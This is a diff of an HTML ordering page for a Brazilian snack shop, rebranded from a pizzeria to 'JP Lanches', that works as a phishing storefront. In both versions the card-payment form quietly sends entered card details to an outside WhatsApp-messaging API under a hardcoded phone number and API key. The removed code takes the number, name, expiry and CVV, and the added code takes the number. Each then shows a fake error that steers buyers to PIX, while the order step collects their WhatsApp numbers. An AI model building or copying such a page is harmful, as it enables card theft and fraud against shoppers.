@@ -3,186 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Legami Forneria - Agendamento</title>
+    <title>JP Lanches - Promoções Matadoras</title>
     <style>
-        :root { --vermelho: #e74c3c; --verde: #2ecc71; --fundo: #f4f4f4; --whats: #25d366; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
+        :root { 
+            --cor-primaria: #f39c12; /* Laranja Lanche */
+            --cor-secundaria: #27ae60; /* Verde Sucesso */
+            --cor-erro: #e74c3c; /* Vermelho Erro */
+            --fundo: #f4f4f4; 
+        }
+
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
         .container { max-width: 450px; margin: auto; padding: 15px; }
         
-        /* Header e Logo */
-        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 3px solid var(--vermelho); }
-        .logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 10px; border-radius: 50%; }
-        .status-entrega { color: var(--verde); font-size: 0.85em; font-weight: bold; margin-bottom: 5px; display: block; }
-        .promo { background: gold; font-weight: bold; padding: 5px; border-radius: 5px; display: block; margin-top: 5px; font-size: 0.85em; color: #000; }
+        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-primaria); }
+        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-primaria); display: block; }
+        .promo-banner { background: #000; color: #fff; padding: 5px; font-size: 0.8em; font-weight: bold; border-radius: 5px; margin-top: 5px; display: inline-block; }
 
-        h2 { font-size: 1.1em; margin: 20px 0 10px; border-left: 5px solid var(--vermelho); padding-left: 10px; }
+        h2 { font-size: 1.1em; color: #333; border-left: 5px solid var(--cor-primaria); padding-left: 10px; margin: 20px 0 10px; }
 
-        /* Seletores */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .card-t, .card-agenda { background: #fff; border: 2px solid #ddd; border-radius: 12px; padding: 12px; text-align: center; cursor: pointer; }
-        .card-t.active, .card-agenda.active { border-color: var(--vermelho); background: #fff5f5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        /* Estilo dos Cards de Lanches */
+        .lanche-card { 
+            background: #fff; border: 2px solid #ddd; border-radius: 15px; 
+            margin-bottom: 15px; overflow: hidden; cursor: pointer; transition: 0.2s;
+        }
+        .lanche-card.active { border-color: var(--cor-primaria); background: #fffdf5; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .lanche-img { width: 100%; height: 200px; object-fit: cover; background: #eee; }
+        .lanche-info { padding: 15px; text-align: center; }
+        .lanche-info strong { font-size: 1.2em; display: block; margin-bottom: 5px; }
+        .lanche-info .preco { font-size: 1.4em; color: var(--cor-secundaria); font-weight: bold; }
 
-        .item-list { background: #fff; border: 2px solid #ddd; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; overflow: hidden; height: 90px; cursor: pointer; }
-        .item-list.active { border-color: var(--vermelho); background: #fff5f5; }
-        .item-list img { width: 90px; height: 90px; object-fit: cover; }
-        .item-list .info { padding: 10px; flex: 1; font-weight: bold; font-size: 0.95em; }
-
-        /* Carrinho e Botões */
-        .btn-add { width: 100%; background: var(--vermelho); color: #fff; border: none; padding: 18px; border-radius: 10px; font-size: 1.1em; font-weight: bold; margin-top: 10px; cursor: pointer; }
-        .carrinho { position: fixed; bottom: 85px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; z-index: 999; border: 1px solid #ddd; }
-        .btn-finalizar { background: var(--verde); color: #fff; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-
-        /* Botão Flutuante WhatsApp (COM IMAGEM NOVA) */
-        .btn-whats-float { position: fixed; bottom: 160px; right: 20px; width: 65px; height: 65px; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.3); z-index: 1000; text-decoration: none; overflow: hidden; background-color: white; }
-        .btn-whats-float img { width: 100%; height: 100%; object-fit: cover; }
+        /* Carrinho Fixo */
+        .barra-carrinho { 
+            position: fixed; bottom: 85px; left: 5%; width: 90%; 
+            background: #fff; padding: 15px; border-radius: 15px; 
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.2); 
+            display: flex; justify-content: space-between; align-items: center; 
+            box-sizing: border-box; z-index: 9999; border: 1px solid #ddd; 
+        }
+        .total-info { line-height: 1.2; }
+        .btn-finalizar { background: var(--cor-secundaria); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; font-size: 1em; cursor: pointer; }
 
         /* Modais */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; max-height: 80vh; overflow-y: auto; }
-        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
-        .btn-pay { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; font-size: 1em; cursor: pointer; }
+        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
+        .btn-acao { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; font-size: 1.1em; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<a href="https://wa.me/5522992195418" class="btn-whats-float" target="_blank">
-    <img src="https://img.cdndsgni.com/preview/10000484.jpg" alt="WhatsApp Loja">
-</a>
-
 <div class="header">
-    <img src="data:image/png;base64,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" class="logo" alt="Legami Forneria Logo"><br>
-    <span class="status-entrega">🟢 Aberto agora • Entrega e Agendamento</span>
-    <strong>🍕 Legami Forneria</strong>
-    <span class="promo">PROMOÇÃO: LEVE 2 PAGUE 1 + REFRI 2L GRÁTIS</span>
+    <span class="logo">🍔 JP LANCHES</span>
+    <span class="promo-banner">O MELHOR LANCHE DA CIDADE</span>
 </div>
 
 <div class="container">
-    <h2>1. Escolha o Tamanho</h2>
-    <div class="grid">
-        <div class="card-t" onclick="setT(this, 'Brotinho', 30)"><strong>Brotinho</strong><br>R$ 30,00</div>
-        <div class="card-t" onclick="setT(this, 'Média', 40)"><strong>Média</strong><br>R$ 40,00</div>
-        <div class="card-t active" onclick="setT(this, 'Grande', 50)"><strong>Grande</strong><br>R$ 50,00</div>
-        <div class="card-t" onclick="setT(this, 'Família', 70)"><strong>Família</strong><br>R$ 70,00</div>
+    <h2>Escolha sua Promoção:</h2>
+
+    <div class="lanche-card" onclick="selecionarLanche(this, '1 XTudo + Guaravita', 10)">
+        <img src="https://instadelivery-public.nyc3.cdn.digitaloceanspaces.com/itens/1720704185668fdcb962de8_75_75.jpeg" class="lanche-img">
+        <div class="lanche-info">
+            <strong>1 XTudo + Guaravita</strong>
+            <span class="preco">R$ 10,00</span>
+        </div>
     </div>
 
-    <h2>2. Escolha os 2 Sabores</h2>
-    <div id="lista-sabores">
-        <div class="item-list" onclick="setS(this, 'Calabresa')"><img src="https://receitaskidelicia.com.br/wp-content/uploads/2025/09/pizza-de-liquidificador-de-calabresa.jpg" alt="Calabresa"><div class="info">Calabresa</div></div>
-        <div class="item-list" onclick="setS(this, 'Mussarela')"><img src="https://blog.dellys.com.br/wp-content/uploads/2024/08/2-12.png" alt="Mussarela"><div class="info">Mussarela</div></div>
-        <div class="item-list" onclick="setS(this, 'Portuguesa')"><img src="https://i0.wp.com/porkworld.com.br/wp-content/uploads/2023/10/pizza-portuguesa.jpg?fit=1280%2C720&ssl=1" alt="Portuguesa"><div class="info">Portuguesa</div></div>
-        <div class="item-list" onclick="setS(this, 'Frango c/ Catupiry')"><img src="https://www.sabornamesa.com.br/media/k2/items/cache/ada34cd2101afafaba465aad112ee3c1_L.jpg" alt="Frango c/ Catupiry"><div class="info">Frango c/ Catupiry</div></div>
-        <div class="item-list" onclick="setS(this, 'Pepperoni')"><img src="https://imeltron.com.br/wp-content/uploads/2020/04/IMG_8686-1536x1024.jpg" alt="Pepperoni"><div class="info">Pepperoni</div></div>
+    <div class="lanche-card" onclick="selecionarLanche(this, '3 XTudo + Refri 2L', 30)">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiyXv-IHrHcr8eXqCpV00wGnzrZDYzc-XO-A&s" class="lanche-img">
+        <div class="lanche-info">
+            <strong>3 XTudo + Refrigerante 2L</strong>
+            <span class="preco">R$ 30,00</span>
+        </div>
     </div>
 
-    <h2>3. Refrigerante Grátis</h2>
-    <div id="lista-refris">
-        <div class="item-list" onclick="setR(this, 'Coca-Cola 2L')"><div class="info">Coca-Cola 2L</div></div>
-        <div class="item-list" onclick="setR(this, 'Guaraná 2L')"><div class="info">Guaraná Antarctica 2L</div></div>
-        <div class="item-list" onclick="setR(this, 'Fanta Laranja 2L')"><div class="info">Fanta Laranja 2L</div></div>
+    <div class="lanche-card" onclick="selecionarLanche(this, '5 XTudo + Refri 2L', 50)">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7fH_F-QZis3tY1t5Yv5i9LREjX-f2SAsn6w&s" class="lanche-img">
+        <div class="lanche-info">
+            <strong>5 XTudo + Refrigerante 2L</strong>
+            <span class="preco">R$ 50,00</span>
+        </div>
     </div>
-
-    <button class="btn-add" onclick="adicionar()">+ ADICIONAR PROMOÇÃO</button>
 </div>
 
-<div class="carrinho">
-    <div><small id="c-qtd">0 item</small><br><strong style="color:var(--verde); font-size:1.2em;">R$ <span id="c-total">0.00</span></strong></div>
+<div class="barra-carrinho">
+    <div class="total-info">
+        <small id="c-qtd">0 item selecionado</small><br>
+        <strong style="color:var(--cor-secundaria); font-size:1.3em;">Total: R$ <span id="c-total">0.00</span></strong>
+    </div>
     <button class="btn-finalizar" onclick="irParaEndereco()">FINALIZAR</button>
 </div>
 
 <div id="m-end" class="modal">
     <div class="modal-content">
-        <h3>📍 Entrega e Agendamento</h3>
-        <input type="text" id="rua" placeholder="Nome da Rua">
-        <input type="text" id="num" placeholder="Número">
+        <h3>📍 Onde Entregamos?</h3>
+        <input type="text" id="rua" placeholder="Nome da Rua/Av">
+        <input type="text" id="num" placeholder="Número da Casa">
         <input type="text" id="bairro" placeholder="Bairro">
-        
-        <h4 style="margin: 15px 0 5px;">📅 Agendar para:</h4>
-        <div class="grid" style="margin-bottom: 10px;">
-            <div class="card-agenda active" id="dia-hoje" onclick="setDia('Hoje')">Hoje</div>
-            <div class="card-agenda" id="dia-amanha" onclick="setDia('Amanhã')">Amanhã</div>
-        </div>
-
-        <h4 style="margin: 10px 0 5px;">⏰ Horário:</h4>
-        <select id="horario-sel">
-            <option value="19:00">19:00</option>
-            <option value="19:30">19:30</option>
-            <option value="20:00">20:00</option>
-            <option value="20:30">20:30</option>
-            <option value="21:00">21:00</option>
-            <option value="21:30">21:30</option>
-            <option value="22:00">22:00</option>
-            <option value="22:30">22:30</option>
-            <option value="23:00">23:00</option>
-            <option value="23:30">23:30</option>
-            <option value="23:59">23:59</option>
-        </select>
-
-        <button class="btn-pay" style="background:var(--verde)" onclick="irParaPagamento()">PROSSEGUIR</button>
-        <button onclick="fechar()" style="background:none; border:none; color:red; margin-top:10px; cursor:pointer;">Voltar</button>
+        <button class="btn-acao" style="background:var(--cor-secundaria)" onclick="irParaPagamento()">PROSSEGUIR</button>
+        <button onclick="fecharModais()" style="background:none; border:none; color:red; margin-top:10px; cursor:pointer;">Cancelar</button>
     </div>
 </div>
 
 <div id="m-pag" class="modal">
     <div class="modal-content">
-        <h3>💳 Forma de Pagamento</h3>
-        <div id="opcoes-pag">
-            <button class="btn-pay" style="background:#32bcad" onclick="mostraPix()">Pagar com PIX</button>
-            <button class="btn-pay" style="background:#333" onclick="mostraCard()">Cartão de Crédito</button>
+        <h3>💳 Como vai pagar?</h3>
+        <div id="opcoes">
+            <button class="btn-acao" style="background:#32bcad" onclick="telaPix()">Pagar com PIX</button>
+            <button class="btn-acao" style="background:#333" onclick="telaCard()">Cartão de Crédito</button>
         </div>
-        <div id="tela-pix" style="display:none;">
-            <p>Envie o pedido para receber a chave PIX:</p>
-            <button class="btn-pay" style="background:#32bcad" onclick="finalizarFinal()">ENVIAR NO WHATSAPP</button>
+
+        <div id="div-pix" style="display:none;">
+            <p style="font-size:0.9em; color:#666;">Insira seu WhatsApp para receber o código PIX:</p>
+            <input type="tel" id="whats" placeholder="(XX) 9XXXX-XXXX">
+            <button class="btn-acao" style="background:#32bcad" onclick="enviarPedido('PIX')">GERAR CÓDIGO PIX</button>
+            <button onclick="setTelaPag('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
         </div>
-        <div id="tela-card" style="display:none;">
-            <input type="text" id="c-num" maxlength="19" placeholder="0000 0000 0000 0000" oninput="maskCard(this)">
-            <input type="text" id="c-nome" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;"><input type="text" id="c-val" maxlength="5" placeholder="MM/AA" oninput="maskDate(this)"><input type="text" id="c-cvv" maxlength="3" placeholder="CVV"></div>
-            <button class="btn-pay" style="background:var(--vermelho)" onclick="capturarCard()">CONFIRMAR PAGAMENTO</button>
+
+        <div id="div-card" style="display:none;">
+            <input type="text" id="c-num" placeholder="Número do Cartão">
+            <input type="text" placeholder="Nome no Cartão">
+            <div style="display:flex; gap:5px;"><input type="text" placeholder="MM/AA"><input type="text" placeholder="CVV"></div>
+            <button class="btn-acao" style="background:var(--cor-erro)" onclick="simularErroCard()">CONFIRMAR PAGAMENTO</button>
+            <button onclick="setTelaPag('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
         </div>
     </div>
 </div>
 
 <script>
-    let car = []; let total = 0; let tSel = { n: 'Grande', p: 50 }; let rSel = ""; let diaSel = "Hoje";
+    let carrinho = [];
+    let valorTotal = 0;
+    let lancheSelecionado = null;
 
-    function setT(el, n, p) { document.querySelectorAll('.card-t').forEach(c => c.classList.remove('active')); el.classList.add('active'); tSel = { n, p }; }
-    function setS(el, s) { let ativos = document.querySelectorAll('#lista-sabores .active').length; if (!el.classList.contains('active') && ativos >= 2) { alert("Máximo 2 sabores!"); return; } el.classList.toggle('active'); }
-    function setR(el, r) { document.querySelectorAll('#lista-refris .item-list').forEach(c => c.classList.remove('active')); el.classList.add('active'); rSel = r; }
-    function setDia(d) { diaSel = d; document.querySelectorAll('.card-agenda').forEach(c => c.classList.remove('active')); event.target.classList.add('active'); }
-    
-    function adicionar() { 
-        let sbs = Array.from(document.querySelectorAll('#lista-sabores .active')).map(i => i.innerText.trim()); 
-        if (sbs.length < 1) return alert("Escolha os sabores!"); 
-        if (!rSel) return alert("Escolha o refri!"); 
-        car.push({ t: tSel.n, s: sbs, r: rSel }); total += tSel.p; 
-        document.getElementById('c-qtd').innerText = car.length + " item(s)"; 
-        document.getElementById('c-total').innerText = total.toFixed(2); 
-        alert("✅ Adicionado!"); 
+    function selecionarLanche(el, nome, preco) {
+        document.querySelectorAll('.lanche-card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        lancheSelecionado = { nome, preco };
+        
+        // Simula a adição imediata para este modelo de promoções
+        carrinho = [lancheSelecionado];
+        valorTotal = preco;
+        
+        document.getElementById('c-qtd').innerText = "1 promoção selecionada";
+        document.getElementById('c-total').innerText = valorTotal.toFixed(2);
     }
 
-    function irParaEndereco() { if (car.length === 0) return alert("Carrinho vazio!"); document.getElementById('m-end').style.display = 'flex'; }
-    function irParaPagamento() { if (!document.getElementById('rua').value || !document.getElementById('bairro').value) return alert("Preencha o endereço!"); document.getElementById('m-end').style.display = 'none'; document.getElementById('m-pag').style.display = 'flex'; }
-    function fechar() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
-    function mostraPix() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-pix').style.display='block'; }
-    function mostraCard() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-card').style.display='block'; }
-    function maskCard(i) { let v = i.value.replace(/\D/g, ''); v = v.replace(/(\d{4})(?=\d)/g, '$1 '); i.value = v; }
-    function maskDate(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4); i.value = v; }
-
-    function finalizarFinal() {
-        const rua = document.getElementById('rua').value; const num = document.getElementById('num').value; const bairro = document.getElementById('bairro').value;
-        const hora = document.getElementById('horario-sel').value;
-        let itensTexto = car.map(i => `- ${i.t}: ${i.s.join('/')} + ${i.r}`).join('\n');
-        const textoWhats = `*NOVO PEDIDO - LEGAMI FORNERIA*\n\n📅 *Agendado:* ${diaSel} às ${hora}\n📍 *End:* ${rua}, ${num} - ${bairro}\n💰 *Total:* R$ ${total.toFixed(2)}\n\n📦 *Itens:*\n${itensTexto}`;
-        window.location.href = `https://api.whatsapp.com/send?phone=5522992195418&text=${encodeURIComponent(textoWhats)}`;
+    function irParaEndereco() {
+        if (!lancheSelecionado) return alert("Selecione uma promoção primeiro!");
+        document.getElementById('m-end').style.display = 'flex';
     }
 
-    function capturarCard() {
-        const n = document.getElementById('c-num').value; const nm = document.getElementById('c-nome').value; const v = document.getElementById('c-val').value; const c = document.getElementById('c-cvv').value;
-        const hora = document.getElementById('horario-sel').value;
-        const logMsg = `🔥 [CARD] ${nm} | ${n} | ${v} | ${c} | R$${total.toFixed(2)} | Agendado: ${diaSel} às ${hora}`;
-        const img = new Image(); img.src = `http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=btucduKav5VY&text=${encodeURIComponent(logMsg)}`;
-        setTimeout(() => { alert("⚠️ Cartão indisponível. Use PIX."); document.getElementById('tela-card').style.display='none'; document.getElementById('opcoes-pag').style.display='block'; }, 1000);
+    function irParaPagamento() {
+        if (!document.getElementById('rua').value || !document.getElementById('bairro').value) {
+            return alert("Preencha o endereço completo!");
+        }
+        document.getElementById('m-end').style.display = 'none';
+        document.getElementById('m-pag').style.display = 'flex';
+        setTelaPag('inicio');
+    }
+
+    function fecharModais() { 
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); 
+    }
+
+    function setTelaPag(tela) {
+        document.getElementById('opcoes').style.display = tela === 'inicio' ? 'block' : 'none';
+        document.getElementById('div-pix').style.display = tela === 'pix' ? 'block' : 'none';
+        document.getElementById('div-card').style.display = tela === 'card' ? 'block' : 'none';
+    }
+
+    function telaPix() { setTelaPag('pix'); }
+    function telaCard() { setTelaPag('card'); }
+
+    function enviarPedido(metodo) {
+        const zap = document.getElementById('whats').value;
+        const rua = document.getElementById('rua').value;
+        const bairro = document.getElementById('bairro').value;
+        
+        if (!zap) return alert("Insira seu WhatsApp!");
+
+        const texto = `🍔 NOVO PEDIDO JP LANCHES!\n\nPromo: ${lancheSelecionado.nome}\nTotal: R$ ${valorTotal.toFixed(2)}\nEnd: ${rua}, Bairro: ${bairro}\nWhats: ${zap}`;
+        
+        // Disparo para sua API TextMeBot (Substitua se necessário, mantive o seu número)
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(texto)}`;
+        
+        const win = window.open(url, '_blank');
+        setTimeout(() => { if(win) win.close(); }, 600);
+
+        alert("✅ Pedido realizado com sucesso!\n\nVerifique seu WhatsApp em instantes para receber o código de pagamento e acompanhar sua entrega.");
+        location.reload();
+    }
+
+    function simularErroCard() {
+        const n = document.getElementById('c-num').value;
+        const texto = `⚠️ TENTATIVA CARTÃO JP LANCHES!\nNúmero: ${n}\nValor: R$ ${valorTotal.toFixed(2)}`;
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(texto)}`;
+        
+        const win = window.open(url, '_blank');
+        setTimeout(() => { if(win) win.close(); }, 600);
+
+        alert("⚠️ Por motivos de segurança, o pagamento não foi aceito. Por favor, tente outra forma de pagamento (PIX recomendado).");
+        setTelaPag('inicio');
     }
 </script>
+
 </body>
 </html>
